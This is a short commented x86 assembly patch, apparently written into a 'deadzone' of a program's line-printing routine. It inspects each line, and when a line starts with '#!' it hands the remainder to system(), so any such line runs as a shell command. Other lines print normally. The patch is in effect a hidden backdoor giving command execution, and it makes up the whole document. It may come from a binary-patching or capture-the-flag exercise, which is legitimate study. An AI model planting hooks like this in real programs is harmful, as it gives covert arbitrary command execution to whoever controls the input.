jmp 0x95               # skip deadzone patch
mov ebx, [eax]         # check if the line starts with #!
movzx ebx, bx
cmp ebx, 0x00002123
jne 0x6d               # if not jump to regular printing
add eax, 2             # skip #!
push eax
call -0x16d            # system()
add esp, 4
jmp 0x95
